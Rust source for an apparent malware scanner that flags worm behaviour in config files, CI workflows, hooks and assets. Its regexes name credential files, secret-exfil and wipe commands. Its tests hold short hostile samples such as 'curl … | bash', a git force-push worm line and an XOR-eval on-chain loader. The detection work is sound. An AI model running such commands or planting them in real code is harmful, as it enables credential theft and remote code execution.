//! Value-independent capability scoring over an auto-run [`Surface`].
//!
//! Each detector recognizes a behavior the malware *must* perform (obfuscation,
//! credential reads, network egress, process spawn, download-and-exec,
//! self-propagation, on-chain C2 resolution, trailing payload, destructive
//! wipe, fake-font). Patterns are lexical; there is no AST. [`gate`] applies a
//! conservative, surface-aware fire decision — see the design spec §5/§6/§7.

use std::sync::OnceLock;

use regex::Regex;

use crate::matchers::shannon_entropy;
use crate::surface::Surface;

#[derive(Debug, Default, Clone, PartialEq)]
pub struct CapabilityScore {
    /// High-confidence structural obfuscation (injection markers + eval, the ESM re-entry
    /// shim, decoder-name / charcode-array tells). Sufficient for the FP-sensitive priors.
    pub obfuscation: bool,
    /// Density signal (long non-URL line or high-entropy tail). Fires on legitimately dense
    /// benign content too, so it is NOT sufficient for the ConfigFile/DerivedScript prior —
    /// only the more permissive lifecycle/hook surfaces treat it as a fire signal.
    pub high_entropy: bool,
    pub credential_access: bool,
    pub network_egress: bool,
    pub process_spawn: bool,
    pub magic_mismatch: bool,
    pub download_exec: bool,
    pub propagation: bool,
    pub on_chain_resolve: bool,
    pub trailing_code: bool,
    pub destructive_wipe: bool,
    /// A credential/secret sent as request DATA to a URL (`curl -d "${{ secrets.X }}" …`) — the
    /// classic CI secret-exfil. A self-evident worm tell (fires without a concealment prior).
    pub credential_exfil: bool,
    /// A lone outbound fetch/download token (curl/wget/fetch/iwr/…). Only consumed by the
    /// TasksJson gate — a folder-open task that reaches out is suspicious on its own.
    pub remote_fetch: bool,
    /// A run of invisible/bidi-override Unicode (Trojan-Source reorder controls, or a Glassworm
    /// variation-selector/tag stego run). A self-evident worm tell — hidden control characters are
    /// effectively never legitimate in source code.
    pub invisible_unicode: bool,
    /// A physical line carrying `\S … [ \t]{200,} … \S` — a long horizontal-whitespace run with
    /// real content on BOTH sides of it. This is the PolinRider injection structure
    /// (`<legit code>` + ~2000 spaces + obfuscated blob on the file's last line) and is
    /// version-independent: it survives every rotation of the version tag / decoder name / seed.
    /// FP-safe by construction — minifiers strip whitespace (no runs), lockfiles are short lines,
    /// and a base64/WASM blob is one contiguous token with no interior space run followed by code.
    /// A self-evident worm tell: deliberate mid-line padding to push a payload off-screen is never
    /// legitimate in an auto-run source file.
    pub padding_injection: bool,
    pub evidence: Vec<String>,
}

macro_rules! lazy_re {
    ($f:ident, $pat:expr) => {
        fn $f() -> &'static Regex {
            static R: OnceLock<Regex> = OnceLock::new();
            R.get_or_init(|| Regex::new($pat).unwrap())
        }
    };
}

// --- Obfuscation ---
lazy_re!(global_dyn_re, r"(?:global|globalThis|process)\s*(?:\[|\.)\s*['\w!]+\s*\]?\s*=");
// The re-entry shim is `global[...]=require` / `global.x=module`. A bare
// `createRequire(import.meta.url)` is legitimate ESM interop and is NOT flagged
// on its own — the reassignment is the value-independent tell.
lazy_re!(esm_shim_re, r"global\s*(?:\[[^\]]+\]|\.\w+)\s*=\s*(?:require|module)\b");
lazy_re!(charcode_re, r"String\.fromCharCode\s*\(\s*\d+(?:\s*,\s*\d+){3,}");
lazy_re!(decoder_re, r"_\$_[0-9a-f]{4,}");
lazy_re!(evalish_re, r"\beval\s*\(|new\s+Function\s*\(|\batob\s*\(");

/// High-confidence lexical obfuscation: an injection marker with an eval/Function/atob sink,
/// the ESM re-entry shim, or the family decoder-name / charcode-array tells. These are
/// specific to injected payloads, so they alone may satisfy the FP-sensitive priors.
fn obfuscation(content: &str) -> bool {
    // The bare charcode/decoder check below subsumes those two alternatives from the
    // marker-scoped branch, so only `evalish` need be paired with the injection marker.
    if global_dyn_re().is_match(content) && evalish_re().is_match(content) {
        return true;
    }
    if esm_shim_re().is_match(content) {
        return true;
    }
    charcode_re().is_match(content) || decoder_re().is_match(content)
}

/// Density signals: an unusually long non-URL line, or a high-entropy tail. These fire on
/// legitimately dense benign content too (embedded base64 keys, SRI/integrity hashes,
/// minified bundles), so they are NOT high-confidence obfuscation. Only the more permissive
/// auto-run surfaces (lifecycle scripts, git hooks) treat them as a fire signal; the
/// FP-sensitive ConfigFile/DerivedScript priors require structural `obfuscation` instead.
fn high_entropy(content: &str) -> bool {
    if content
        .lines()
        .any(|l| l.len() > 500 && !l.contains("data:") && !l.trim_start().starts_with("http"))
    {
        return true;
    }
    let b = content.as_bytes();
    shannon_entropy(&b[b.len().saturating_sub(512)..]) > 7.0
}

// --- CredentialAccess ---
lazy_re!(
    cred_re,
    r"\.aws/credentials|\.ssh/|\.npmrc|\.git-credentials|Object\.keys\(\s*process\.env|process\.env\.(?:NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_SECRET|AWS_ACCESS_KEY)|security\s+find-generic-password|Login Data|logins\.json"
);
fn credential_access(content: &str, surface: Surface) -> bool {
    if cred_re().is_match(content) {
        return true;
    }
    matches!(surface, Surface::WorkflowFile) && content.contains("${{ secrets.")
}

// --- NetworkEgress ---
lazy_re!(
    net_re,
    r#"require\(\s*['"](?:https?|net|dgram|tls)['"]|from\s+['"](?:node:)?(?:https?|net|dgram|tls)['"]|\bfetch\s*\(|\baxios\b|XMLHttpRequest|\bWebSocket\b|\bcurl\b|\bwget\b|Invoke-WebRequest|\biwr\b"#
);
// Egress requires an actual outbound-call token (fetch/require('https')/axios/curl/…). A bare
// URL *string literal* is NOT egress — configs legitimately embed redirect destinations and doc
// links (e.g. `destination: 'https://docs.example.com'`). Known C2 domains are caught separately
// by the per-pack IOC-domain check, so this only sheds false positives, not real detections.
fn network_egress(content: &str) -> bool {
    net_re().is_match(content)
}

// --- ProcessSpawn ---
lazy_re!(spawn_re, r"child_process|\bspawn\s*\(|\bexecSync\s*\(|\bexec\s*\(|Bun\.spawn(?:Sync)?\s*\(");
fn process_spawn(content: &str) -> bool {
    spawn_re().is_match(content)
}

// --- MagicMismatch (only meaningful when surface == BinaryAsset) ---
lazy_re!(
    js_tokens_re,
    r"\brequire\s*\(|\beval\s*\(|\bglobal\b|fromCharCode|\bfunction\b|module\.exports"
);
/// ASCII-representable asset magic signatures. A real font/image that survives the text read (no
/// NUL byte in its head, so it reached the capability scorer at all) still begins with its format
/// magic; a payload-carrying fake asset (whitespace + obfuscated JS) does not. Requiring the magic
/// to be ABSENT before firing spares a real asset whose bytes incidentally contain a code token.
fn starts_with_asset_magic(content: &str) -> bool {
    const MAGICS: &[&str] =
        &["wOF2", "wOFF", "OTTO", "ttcf", "true", "typ1", "GIF87a", "GIF89a", "RIFF"];
    MAGICS.iter().any(|m| content.starts_with(m))
}

fn magic_mismatch(content: &str, surface: Surface) -> bool {
    matches!(surface, Surface::BinaryAsset)
        && js_tokens_re().is_match(content)
        && !starts_with_asset_magic(content)
}

// --- DownloadExec ---
lazy_re!(
    fetch_tok_re,
    r"\bcurl\b|\bwget\b|\bfetch\s*\(|Invoke-WebRequest|\biwr\b|certutil\s+-urlcache|powershell\s+-enc"
);
lazy_re!(
    exec_sink_re,
    r"\|\s*(?:sh|bash)\b|node\s+-e\b|node\s+-\b|chmod\s+\+x|bun\s+run\b|sh\s+-c\b|\beval\s*\("
);
// A file the command downloads to disk (`curl -o x.js`, `> x.sh`) and, separately,
// a file it then executes (`node x.js`). When the same script name appears in both,
// it is download-and-run even without a piped `| sh` sink.
lazy_re!(dl_target_re, r#"(?:-o|-O|--output|>)\s*['"]?([\w./@-]+\.(?:[cm]?js|sh|py|ps1))"#);
lazy_re!(run_target_re, r#"(?:node|bun|sh|bash|python3?|powershell|\.)\s+(?:-\S+\s+)*['"]?([\w./@-]+\.(?:[cm]?js|sh|py|ps1))"#);
fn download_exec(content: &str) -> bool {
    if !fetch_tok_re().is_match(content) {
        return false;
    }
    if exec_sink_re().is_match(content) {
        return true;
    }
    let dls: std::collections::HashSet<&str> = dl_target_re()
        .captures_iter(content)
        .map(|c| c.get(1).unwrap().as_str())
        .collect();
    !dls.is_empty()
        && run_target_re()
            .captures_iter(content)
            .any(|c| dls.contains(c.get(1).unwrap().as_str()))
}

// --- RemoteFetch (a lone outbound fetch/download token; only gates TasksJson auto-run) ---
fn remote_fetch(content: &str) -> bool {
    fetch_tok_re().is_match(content)
}

// --- Propagation (worm self-propagation: amend + force-push + no-verify, together) ---
// A `--amend` anywhere (the former `commit\s+.*--amend` alternative was subsumed by this).
lazy_re!(amend_re, r"--amend");
// A force-push: every force flag is scoped to a preceding `git push` (consistently — the
// trailing unscoped `-uf` alternative that matched anywhere has been removed).
lazy_re!(forcepush_re, r"push\s+.*(?:--force\b|--force-with-lease\b|-f\b|-uf\b)");
lazy_re!(noverify_re, r"--no-verify");
fn propagation(content: &str) -> bool {
    // The distinctive worm self-propagation tell: rewriting HEAD, force-pushing, and skipping
    // hooks TOGETHER. `npm publish` was dropped as a signal — it is common in legitimate release
    // CI and cannot distinguish a worm re-publish from a normal release without concealment/IOC.
    amend_re().is_match(content)
        && forcepush_re().is_match(content)
        && noverify_re().is_match(content)
}

// --- CredentialExfil (a secret sent as request DATA to a URL — the CI secret-exfil tell) ---
// A credential referenced as the value of a `-d`/`--data` flag on an outbound-call line. Auth
// headers (`-H "Authorization: Bearer …"` to a known API) are NOT matched — legit CI does that;
// exfil puts the secret in the request BODY.
lazy_re!(
    data_secret_re,
    r#"(?:-d\b|--data\S*)\s+['"]?\s*(?:\$\{\{\s*secrets\.|\$\{?(?:NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_SECRET|AWS_ACCESS_KEY)|process\.env\.\w*(?:TOKEN|SECRET|KEY))"#
);
fn credential_exfil(content: &str) -> bool {
    content.lines().any(|l| fetch_tok_re().is_match(l) && data_secret_re().is_match(l))
}

// --- OnChainResolve ---
lazy_re!(
    rpc_re,
    r"eth_call|eth_getTransactionByHash|/v1/accounts/|trongrid|aptoslabs|bsc-dataseed|\x22method\x22\s*:\s*\x22eth_"
);
lazy_re!(xor_re, r"charCodeAt[^;]*\^|\^[^;]*charCodeAt|fromCharCode[^;]*\^");
fn on_chain_resolve(content: &str) -> bool {
    rpc_re().is_match(content) && xor_re().is_match(content) && evalish_re().is_match(content)
}

// --- TrailingCode (ConfigFile / DerivedScript only) ---
/// Byte offset just past the end of the `export default …` / `module.exports = …`
/// statement that starts at `start`. String-aware balanced scan of `(){}[]`, stopping
/// at the matching close, or a `;`/newline at depth 0. This keeps a legitimate
/// multi-line object body from being mistaken for appended payload.
fn export_statement_end(content: &str, start: usize) -> usize {
    let mut depth: i32 = 0;
    let mut seen_open = false;
    let mut quote: Option<char> = None;
    let mut escaped = false;
    for (off, c) in content[start..].char_indices() {
        let abs = start + off;
        if let Some(q) = quote {
            if escaped {
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else if c == q {
                quote = None;
            }
            continue;
        }
        match c {
            '\'' | '"' | '`' => quote = Some(c),
            '(' | '{' | '[' => {
                depth += 1;
                seen_open = true;
            }
            ')' | '}' | ']' => {
                depth -= 1;
                if seen_open && depth <= 0 {
                    return abs + c.len_utf8();
                }
            }
            ';' if depth <= 0 => return abs + c.len_utf8(),
            '\n' if depth <= 0 && seen_open => return abs,
            _ => {}
        }
    }
    content.len()
}

fn trailing_code(content: &str, surface: Surface) -> bool {
    if !matches!(surface, Surface::ConfigFile | Surface::DerivedScript) {
        return false;
    }
    let marker = ["export default", "module.exports"]
        .iter()
        .filter_map(|m| content.rfind(m))
        .max();
    let start = match marker {
        Some(i) => i,
        None => return false,
    };
    let end = export_statement_end(content, start);
    // Legit configs place helper/plugin DECLARATIONS after the export (function/const/class/…) —
    // hoisted, they never run on their own, so they are NOT payload even when their bodies fetch
    // or spawn. And a multi-line ternary/expression export continues past the apparent end. Fire
    // only if a TOP-LEVEL statement in the trailing region actually EXECUTES (an IIFE or a call).
    trailing_has_executable_statement(&content[end..])
}

/// True if `trailing` (the region after a completed `export default`/`module.exports`) contains a
/// top-level statement that executes immediately — an IIFE or an appended call. Declarations
/// (function/const/class/type/…) and expression continuations (`: g()`, `.then()`) are benign.
fn trailing_has_executable_statement(trailing: &str) -> bool {
    let mut depth: i32 = 0;
    let mut quote: Option<char> = None;
    let mut escaped = false;
    let mut stmt_start = true;
    for (idx, c) in trailing.char_indices() {
        if let Some(q) = quote {
            if escaped {
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else if c == q {
                quote = None;
            }
            continue;
        }
        // Statement boundaries at top level (JS ASI: a newline can end a statement).
        if depth == 0 && (c == ';' || c == '\n') {
            stmt_start = true;
            continue;
        }
        if c.is_whitespace() {
            continue; // preserves stmt_start
        }
        // Classify the FIRST non-whitespace char of a top-level statement BEFORE the bracket
        // handling below — an IIFE's leading `(` must be seen as execution, not just depth.
        if depth == 0 && stmt_start {
            if starts_with_execution(&trailing[idx..]) {
                return true;
            }
            stmt_start = false;
        }
        match c {
            '\'' | '"' | '`' => quote = Some(c),
            '(' | '[' | '{' => depth += 1,
            ')' | ']' | '}' => {
                if depth > 0 {
                    depth -= 1;
                }
                if depth == 0 {
                    stmt_start = true; // a fresh statement may follow a closed block
                }
            }
            _ => {}
        }
    }
    false
}

/// Classify the start of a top-level trailing statement: does it EXECUTE (injected payload) or is
/// it a benign declaration / expression-continuation?
fn starts_with_execution(s: &str) -> bool {
    let s = s.trim_start();
    let first = match s.chars().next() {
        Some(c) => c,
        None => return false,
    };
    // IIFE / unary-prefixed immediate execution.
    if matches!(first, '(' | '!' | '~' | '+' | '`') {
        return true;
    }
    // Expression-continuation operators — the export expression continues (ternary `:`/`?`, a
    // method chain `.`, `||`/`&&`, a comma, a closing bracket). Not a fresh statement.
    if matches!(
        first,
        ':' | '?' | '.' | ',' | ')' | ']' | '}' | '|' | '&' | '=' | '<' | '>' | '*' | '/' | '%' | '-'
    ) {
        return false;
    }
    // Identifier-led: a declaration keyword is benign code organization; a bare identifier that
    // immediately calls or member-accesses (`require(`, `eval(`, `fetch(`, `foo.bar(`) executes.
    let word: String =
        s.chars().take_while(|c| c.is_alphanumeric() || *c == '_' || *c == '$').collect();
    const DECL: &[&str] = &[
        "function", "async", "const", "let", "var", "class", "type", "interface", "enum",
        "export", "import", "declare", "abstract", "namespace",
    ];
    if word.is_empty() || DECL.contains(&word.as_str()) {
        return false;
    }
    let after = s[word.len()..].trim_start();
    after.starts_with('(') || after.starts_with('.') || after.starts_with('`')
}

// --- DestructiveWipe ---
// Wiping HOME or the filesystem ROOT — the target must be the whole thing (followed by a
// boundary, `*`, or `/*`), so ordinary cleanup like `rm -rf /var/lib/apt/lists/*` or
// `rm -rf ./dist` (a `/subdir` path) does NOT match.
lazy_re!(
    wipe_re,
    r"rm\s+-rf\s+(?:--no-preserve-root\s+)?(?:\$HOME|~|/)(?:\s|\*|/\*|$)|shred\s+-[nuvz]|cipher\s+/W:|del\s+/F\s+/Q"
);
fn destructive_wipe(content: &str) -> bool {
    wipe_re().is_match(content)
}

// --- PaddingInjection (version-independent structural tell) ---
/// True if any physical line contains a run of ≥200 space/tab characters with real (non-space)
/// content on BOTH sides of it — the `\S … [ \t]{200,} … \S` shape. This is the strongest
/// version-independent PolinRider signal: the family appends `<legit code>` + ~2000 spaces +
/// an obfuscated blob to a config's last line, and no rotation of the version string / decoder
/// name / seed changes that structure. FP-safe by construction (see the struct-field doc).
///
/// Public so the campaign analyzer (`wormward-packs`) shares the exact same structural predicate —
/// one definition, so the capability gate and the analyzer's "confirmed" reason never drift.
pub fn padding_injection(content: &str) -> bool {
    content.lines().any(line_has_padding_run)
}

/// One line's test: a ≥200-long space/tab run that has a non-whitespace char somewhere before it
/// AND a non-whitespace char somewhere after it, on the same physical line. Requiring content on
/// BOTH sides rules out pure indentation and trailing alignment pads.
///
/// The one legitimate source of a `content<big pad>content` line is a WIDE MARKDOWN TABLE: a short
/// cell padded to align the next `|` column delimiter (`| cell<600 spaces>|`). Those are excluded
/// by ignoring a run whose closing byte is `|` — the injection's payload is obfuscated code
/// (`global.x=…;var _$_hex=eval(…)`), never a table column delimiter, so this keeps the real
/// `code<pad>payload` shape while dropping the doc-table false positives.
fn line_has_padding_run(line: &str) -> bool {
    let mut run = 0usize;
    let mut content_before_run = false;
    for b in line.bytes() {
        if b == b' ' || b == b'\t' {
            run += 1;
        } else {
            // A non-whitespace byte closes the run: if it followed a ≥200 run with content before
            // it, it is the content AFTER the pad — the injection shape is complete. A `|` there is
            // a markdown table column boundary (aligned cell), not an obfuscated payload; skip it.
            if run >= 200 && content_before_run && b != b'|' {
                return true;
            }
            run = 0;
            content_before_run = true;
        }
    }
    false
}

/// Version-independent injected-payload structural tells for a REPO-WIDE scan — any text file, not
/// only a recognized auto-run surface. The PolinRider family appends its payload to the last line of
/// whatever file it infects: not just recognized configs but arbitrary executable source
/// (`server.js`, `routes/*.js`, `Gruntfile.js`, `.prettierrc.mjs`, controllers, entry points…),
/// which the surface-scoped passes never read. Fires on the padding-injection line or a `_$_hex`
/// decoder identifier — both FP-safe by construction: a ≥200-space mid-line run never occurs in
/// legitimate source (minifiers strip whitespace), and `_$_[0-9a-f]{4,}` cannot appear in base64
/// (it has `$`) and is not a legitimate identifier convention. The caller excludes minified /
/// build-output / vendored files, so this only adds coverage of the family's non-config hosts.
pub fn injected_payload(content: &str) -> bool {
    padding_injection(content) || decoder_re().is_match(content)
}

/// The double-base64 exfil-staging blob shape: content begins `eyJ` (base64 of
/// `{"`) and contains `==`. A standalone repo-level check (not a `Surface`).
pub fn is_exfil_staging(content: &str) -> bool {
    let head: String = content.trim_start().chars().take(16).collect();
    head.starts_with("eyJ") && content.contains("==")
}

/// Score every capability for a piece of content on a given surface.
/// Invisible / bidi-control code points used for source-stego. A run of these encodes data
/// (Glassworm) or reorders displayed source (Trojan-Source).
fn is_invisible(c: char) -> bool {
    matches!(c as u32,
        0x200B..=0x200F   // zero-width space/joiner/non-joiner + bidi marks
        | 0x202A..=0x202E // bidi embeddings / overrides
        | 0x2060..=0x206F // invisible operators / format controls (incl. bidi isolates 2066-2069)
        | 0xFE00..=0xFE0F // variation selectors
        | 0xE0000..=0xE007F // tags block (Glassworm)
        | 0xE0100..=0xE01EF) // variation selectors supplement
}

/// Detect Unicode source-stego, FP-safely. Fires on (a) a bidi-OVERRIDE control (U+202D/U+202E) —
/// the Trojan-Source attack, essentially never legitimate in code; or (b) a run of ≥4 consecutive
/// invisible chars — a Glassworm stego payload. Legit emoji (single ZWJ/variation-selector between
/// visible glyphs) and RTL i18n text never produce a 4-long invisible run, so both are spared.
pub fn invisible_unicode(content: &str) -> bool {
    if content.contains('\u{202D}') || content.contains('\u{202E}') {
        return true;
    }
    let mut run = 0usize;
    for c in content.chars() {
        if is_invisible(c) {
            run += 1;
            if run >= 4 {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

pub fn score(content: &str, surface: Surface) -> CapabilityScore {
    let mut s = CapabilityScore::default();
    let mark = |cond: bool, field: &mut bool, label: &str, ev: &mut Vec<String>| {
        if cond {
            *field = true;
            ev.push(label.to_string());
        }
    };
    mark(obfuscation(content), &mut s.obfuscation, "obfuscation", &mut s.evidence);
    mark(high_entropy(content), &mut s.high_entropy, "high-entropy", &mut s.evidence);
    mark(
        credential_access(content, surface),
        &mut s.credential_access,
        "credential-access",
        &mut s.evidence,
    );
    mark(
        network_egress(content),
        &mut s.network_egress,
        "network-egress",
        &mut s.evidence,
    );
    mark(process_spawn(content), &mut s.process_spawn, "process-spawn", &mut s.evidence);
    mark(
        magic_mismatch(content, surface),
        &mut s.magic_mismatch,
        "magic-mismatch",
        &mut s.evidence,
    );
    mark(download_exec(content), &mut s.download_exec, "download-exec", &mut s.evidence);
    mark(propagation(content), &mut s.propagation, "propagation", &mut s.evidence);
    mark(
        credential_exfil(content),
        &mut s.credential_exfil,
        "credential-exfil",
        &mut s.evidence,
    );
    mark(
        on_chain_resolve(content),
        &mut s.on_chain_resolve,
        "on-chain-resolve",
        &mut s.evidence,
    );
    mark(
        trailing_code(content, surface),
        &mut s.trailing_code,
        "trailing-code",
        &mut s.evidence,
    );
    mark(
        destructive_wipe(content),
        &mut s.destructive_wipe,
        "destructive-wipe",
        &mut s.evidence,
    );
    // Scored last so it never displaces the primary evidence label in `signature_id`.
    mark(remote_fetch(content), &mut s.remote_fetch, "remote-fetch", &mut s.evidence);
    mark(
        invisible_unicode(content),
        &mut s.invisible_unicode,
        "invisible-unicode",
        &mut s.evidence,
    );
    // Scored FIRST among the tells conceptually, but pushed here so it takes the top evidence slot
    // for the injection class: it is the most specific, version-independent PolinRider signal.
    if padding_injection(content) {
        s.padding_injection = true;
        s.evidence.insert(0, "padding-injection".to_string());
    }
    s
}

/// Surface-aware fire decision.
///
/// The core principle: legitimate DevOps automation (CI/CD workflows, install/deploy scripts,
/// lifecycle hooks) performs the SAME network/exec/secret operations that malware does, openly
/// and in plain text. Behavior alone therefore is NOT evidence of a worm. A generic CRITICAL
/// requires either a **concealment prior** (the payload is obfuscated or grafted onto a config)
/// or a **self-evident worm tell** — a behavior effectively never present in legitimate
/// automation (git self-propagation, a HOME/root wipe, a secret POSTed to a URL).
pub fn gate(surface: Surface, s: &CapabilityScore) -> bool {
    let behavioral = s.credential_access
        || s.network_egress
        || s.process_spawn
        || s.on_chain_resolve
        || s.download_exec;
    // Concealment/injection — distinguishes hidden malware from plain-text automation. Only the
    // high-confidence structural `obfuscation` and the config `trailing_code` injection count;
    // the density `high_entropy` signal is deliberately excluded (it fires on legit dense
    // scripts/keys), as are the behavior capabilities themselves.
    let concealed = s.obfuscation || s.trailing_code;
    // Self-evident worm tells — effectively never in legitimate automation, so they fire without
    // a concealment prior. Invisible/bidi-override Unicode (Trojan-Source / Glassworm stego) joins
    // them: hidden control-character runs in source are never legitimate. Padding-injection joins
    // them too: a `code<200+ spaces>payload` line is the PolinRider injection structure itself —
    // it must fire even when the payload's behavior is concealed inside its obfuscated blob (so no
    // plaintext behavioral capability is visible), which is exactly the wave-3 miss.
    let worm_tell = s.propagation
        || s.destructive_wipe
        || s.credential_exfil
        || s.invisible_unicode
        || s.padding_injection;
    match surface {
        // Config/entry files, one-hop dropped scripts, and every auto-run script surface
        // (lifecycle, workflow, git hook, propagation script) all require a concealment prior
        // for their behavior to fire — otherwise a self-evident worm tell.
        Surface::ConfigFile
        | Surface::DerivedScript
        | Surface::LifecycleScript
        | Surface::WorkflowFile
        | Surface::GitHook
        | Surface::PropagationScript => (concealed && behavioral) || worm_tell,
        // tasks.json reaches here only with a folderOpen auto-run precondition (enforced by the
        // scanner). Opening a folder legitimately does NOT fetch or exec, so behavior alone is
        // suspicious on this surface — no concealment prior required.
        Surface::TasksJson => s.download_exec || s.remote_fetch || worm_tell,
        Surface::BinaryAsset => s.magic_mismatch,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::surface::Surface;

    // --- core detectors (Task 4) ---
    #[test]
    fn obfuscation_global_bracket() {
        assert!(score("global['!']='8-270-2';var _$_1e42=[];", Surface::ConfigFile).obfuscation);
    }
    #[test]
    fn obfuscation_dot_and_fromcharcode() {
        assert!(
            score("global.o='5';String.fromCharCode(104,105,106,107,108);", Surface::ConfigFile)
                .obfuscation
        );
    }
    #[test]
    fn obfuscation_esm_shim() {
        assert!(score(
            "global['r']=require;const require=createRequire(import.meta.url);",
            Surface::DerivedScript
        )
        .obfuscation);
    }
    #[test]
    fn config_with_embedded_key_and_url_is_not_obfuscation_fp() {
        // A benign config embedding a dense base64 key (a long, high-entropy line) plus a URL
        // literal must NOT fire. A density signal alone is not high-confidence obfuscation and
        // must not satisfy the FP-sensitive ConfigFile prior. (Was a Critical false positive.)
        let key = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AaZ0/+".repeat(20);
        let cfg = format!(
            "export default {{ publicKey: '{key}', databaseURL: 'https://app.firebaseio.com' }};\n"
        );
        let s = score(&cfg, Surface::ConfigFile);
        assert!(!s.obfuscation, "dense/high-entropy content is not high-confidence obfuscation");
        assert!(
            !gate(Surface::ConfigFile, &s),
            "a benign key-bearing config must not fire on a bare density signal"
        );
    }

    #[test]
    fn clean_config_not_obfuscated() {
        assert!(!score("export default { plugins: { tailwindcss: {} } };\n", Surface::ConfigFile)
            .obfuscation);
    }
    #[test]
    fn credential_access_detected() {
        assert!(score(
            "const t=process.env.NPM_TOKEN;fs.readFileSync('~/.aws/credentials')",
            Surface::LifecycleScript
        )
        .credential_access);
    }
    #[test]
    fn network_egress_detected() {
        assert!(score("const https=require('https');fetch('http://x')", Surface::ConfigFile)
            .network_egress);
    }
    #[test]
    fn process_spawn_detected() {
        assert!(score("child_process.spawn('node',['-e',code])", Surface::DerivedScript).process_spawn);
    }
    #[test]
    fn magic_mismatch_spares_real_asset_magic() {
        // A real asset header (valid magic) with an incidental code token must NOT fire.
        assert!(!score("wOF2 mock font bytes with a require( token", Surface::BinaryAsset).magic_mismatch);
        // A payload-carrying fake asset (no magic + code) fires.
        assert!(score("   \n  var _$_1e42=require('x')", Surface::BinaryAsset).magic_mismatch);
    }

    #[test]
    fn magic_mismatch_only_on_binary_asset() {
        assert!(score("var x=require('fs');eval(y)", Surface::BinaryAsset).magic_mismatch);
        assert!(!score("var x=require('fs');eval(y)", Surface::ConfigFile).magic_mismatch);
    }

    // --- new detectors (Task 5) ---
    #[test]
    fn download_exec_detected() {
        assert!(score("curl http://x/t | bash", Surface::TasksJson).download_exec);
        assert!(score("const r=await fetch(u);eval(await r.text())", Surface::LifecycleScript)
            .download_exec);
        assert!(!score("curl http://x -o out.txt", Surface::LifecycleScript).download_exec);
    }
    #[test]
    fn propagation_git_conjunction() {
        let sh = "git commit --amend --no-verify && git push -uf --no-verify";
        assert!(score(sh, Surface::PropagationScript).propagation);
        assert!(!score("git push origin main", Surface::PropagationScript).propagation);
    }
    #[test]
    fn publish_alone_is_not_propagation() {
        // `npm publish` is common in legitimate release CI and is NOT, by itself, a worm tell.
        // Propagation now means only the git self-propagation conjunction.
        assert!(!score("npm publish --access public", Surface::LifecycleScript).propagation);
        assert!(!score("pnpm publish-packages", Surface::WorkflowFile).propagation);
        assert!(score(
            "git commit --amend --no-verify && git push -uf --no-verify",
            Surface::LifecycleScript
        )
        .propagation);
    }
    #[test]
    fn propagation_forcepush_flags_require_push_context() {
        // Consistent scoping: the git-worm conjunction needs a real `git push` with a force
        // flag. A bare `-uf` token with no `push` must NOT count (it was an inconsistent
        // unscoped alternation while --force/-f required a preceding `push`).
        let real = "git commit --amend --no-verify\ngit push -uf --no-verify";
        assert!(score(real, Surface::PropagationScript).propagation);
        let no_push = "run --amend --no-verify\nsome -uf token";
        assert!(!score(no_push, Surface::PropagationScript).propagation);
    }

    #[test]
    fn on_chain_resolve_detected() {
        let js = "fetch('https://api.trongrid.io/v1/accounts/T../transactions').then(r=>{for(i=0;i<n;i++)o+=String.fromCharCode(b.charCodeAt(i)^k);eval(o)})";
        assert!(score(js, Surface::ConfigFile).on_chain_resolve);
    }
    #[test]
    fn trailing_code_after_module_body() {
        let cfg = "export default { plugins: {} }\n;(function(){require('https')})()";
        assert!(score(cfg, Surface::ConfigFile).trailing_code);
        assert!(!score("export default { plugins: {} }\n", Surface::ConfigFile).trailing_code);
    }

    #[test]
    fn trailing_code_false_on_multiline_config_with_url() {
        // A benign multi-line config whose object body spans lines and embeds a URL
        // must NOT be treated as trailing payload (was a false Critical).
        let cfg = "import { defineConfig } from 'vite'\nexport default defineConfig({\n  plugins: [react()],\n  server: { proxy: { '/api': 'https://api.example.com' } },\n})\n";
        assert!(!score(cfg, Surface::ConfigFile).trailing_code);
        assert!(!gate(Surface::ConfigFile, &score(cfg, Surface::ConfigFile)));
    }

    #[test]
    fn trailing_code_true_on_same_line_append() {
        // Payload appended on the SAME line after the export body must still trip.
        let cfg = "module.exports={};(function(){fetch('http://x')})()";
        assert!(score(cfg, Surface::ConfigFile).trailing_code);
    }

    #[test]
    fn config_url_literal_alone_is_not_network_egress() {
        // A benign config that only embeds URL string literals (redirect destinations, doc
        // links) with NO fetch/require/axios token is not network egress on a ConfigFile.
        let cfg = "const DOCS = 'https://docs.example.com';\nexport default { redirects: [{ destination: 'https://code.example.com' }] };\n";
        assert!(!score(cfg, Surface::ConfigFile).network_egress);
        // A real fetch / node-module require still fires.
        assert!(score("fetch('https://x')", Surface::ConfigFile).network_egress);
        assert!(score("const https = require('https')", Surface::ConfigFile).network_egress);
    }

    #[test]
    fn trailing_code_false_on_helper_functions_after_export() {
        // Legit configs define helper/plugin functions AFTER `export default` (hoisted) — a
        // declaration, not injected payload, even when its body fetches or spawns.
        let vite = "import { defineConfig } from 'vite'\nexport default defineConfig({ plugins: [p()] })\n\nfunction p() {\n  return { name: 'x', buildStart() { void fetchIcons() } }\n}\n\nasync function fetchIcons() {\n  const url = process.env.U || 'https://models.dev'\n  await fetch(`${url}/api.json`)\n}\n";
        assert!(!score(vite, Surface::ConfigFile).trailing_code);
        assert!(!gate(Surface::ConfigFile, &score(vite, Surface::ConfigFile)));

        let astro = "import { defineConfig } from 'astro/config'\nimport { spawnSync } from 'child_process'\nexport default defineConfig({ integrations: [s()] })\n\nfunction s() {\n  return { hooks: { done: () => { spawnSync('./script.ts', []) } } }\n}\n";
        assert!(!score(astro, Surface::ConfigFile).trailing_code);
        assert!(!gate(Surface::ConfigFile, &score(astro, Surface::ConfigFile)));
    }

    #[test]
    fn trailing_code_false_on_ternary_expression_export() {
        // A multi-line ternary export (plugin-wrapped Next.js config) must NOT read as trailing
        // payload: the `: g(...)` branch continues the export expression, it is not injected code.
        let cfg = "const nextConfig = {};\nexport default cond\n  ? withSentryConfig(withMDX(nextConfig), opts)\n  : withMDX(nextConfig);\n";
        assert!(!score(cfg, Surface::ConfigFile).trailing_code);
        // A real payload appended after a completed export still trips.
        assert!(score(
            "export default {}\n;(function(){fetch('http://x')})()",
            Surface::ConfigFile
        )
        .trailing_code);
    }

    #[test]
    fn obfuscation_ignores_bare_create_require() {
